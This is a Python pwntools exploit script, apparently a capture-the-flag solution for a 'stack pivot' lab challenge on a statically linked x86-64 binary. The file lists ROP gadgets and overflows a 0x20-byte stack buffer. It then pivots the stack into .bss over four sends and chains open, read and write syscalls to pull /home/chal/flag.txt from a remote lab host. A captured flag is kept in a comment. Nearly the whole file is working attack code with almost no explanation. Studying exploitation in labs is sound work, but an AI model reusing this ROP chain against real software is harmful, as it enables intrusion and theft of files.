from pwn import *

# ./src/lab_stack_pivot/share/chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# 0x0000000000401832 : pop rdi ; ret
# 0x000000000040f01e : pop rsi ; ret
# 0x000000000047dcbb : pop rdx ; pop rbx ; ret
# 0x000000000040173f : pop rdx ; ret
# 0x0000000000448d27 : pop rax ; ret
# 0x0000000000401cfc : leave ; ret

# find the syscall that near read write
# since will go to ret very fast
# 0000000000448270 <__libc_read>:
#   ...
#   448280:	0f 05                	syscall

# 0000000000401cd5 <main>:
#   401cd5:	f3 0f 1e fa          	endbr64
#   401cd9:	55                   	push   %rbp
#   401cda:	48 89 e5             	mov    %rsp,%rbp
#   401cdd:	48 83 ec 20          	sub    $0x20,%rsp
#   401ce1:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
#   401ce5:	ba 80 00 00 00       	mov    $0x80,%edx
#   401cea:	48 89 c6             	mov    %rax,%rsi
#   401ced:	bf 00 00 00 00       	mov    $0x0,%edi
#   401cf2:	e8 79 65 04 00       	call   448270 <__libc_read>

context.arch = 'amd64'

pop_rdi = 0x0000000000401832
pop_rsi = 0x000000000040f01e
pop_rdx_rbx = 0x000000000047dcbb
pop_rdx = 0x000000000040173f
pop_rax = 0x0000000000448d27
# leave_ret = 0x0000000000401cfc

syscall = 0x448280
main_read = 0x401ce1
# main_read = 0x0000000000401cd5

bss_1 = 0x00000000004c2700
bss_2 = 0x00000000004c2900
bss_3 = 0x00000000004c2800

# p = process('./src/lab_stack_pivot/share/chal')
p = remote('10.113.184.121', 10054)

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     p,
#     gdbscript=gdbscript,
# )

# raw_input()

payload_BOF = b'a' * 0x20
payload_flag = b'/home/chal/flag.txt'.ljust(0x20, b'\x00')

paylaod_1 = payload_BOF + flat([
    #
    bss_1,
    #
    main_read,
])
print(f"{paylaod_1 = }")
p.send(paylaod_1)

paylaod_2 = payload_flag + flat([
    #
    bss_2,
    #
    pop_rdi,
    bss_1 - 0x20,
    pop_rsi,
    0,
    # pop_rdx,
    # 0,
    pop_rdx_rbx,
    0,
    0,
    pop_rax,
    0x2,  # open
    syscall,
    #
    main_read,
])
print(f"{paylaod_2 = }")
p.send(paylaod_2)

paylaod_3 = payload_BOF + flat([
    #
    bss_1,
    #
    pop_rdi,
    3,
    pop_rsi,
    bss_3,
    # pop_rdx,
    # 0x30,
    pop_rdx_rbx,
    0x30,
    0,
    pop_rax,
    0x0,  # read
    syscall,
    #
    main_read,
])
print(f"{paylaod_3 = }")
p.send(paylaod_3)

paylaod_4 = payload_BOF + flat([
    #
    bss_2,
    #
    pop_rdi,
    1,
    pop_rsi,
    bss_3,
    # pop_rdx,
    # 0x30,
    pop_rdx_rbx,
    0x30,
    0,
    pop_rax,
    0x1,  # write
    syscall,
    #
    0,
])
print(f"{paylaod_4 = }")
p.send(paylaod_4)

flag = p.recvall()
print(f"{flag = }")

# flag = b'flag{www.youtube.com/watch?v=VLxvVPNpU04}\n\x00\x00\x00\x00\x00\x00Segmentation fault\n'
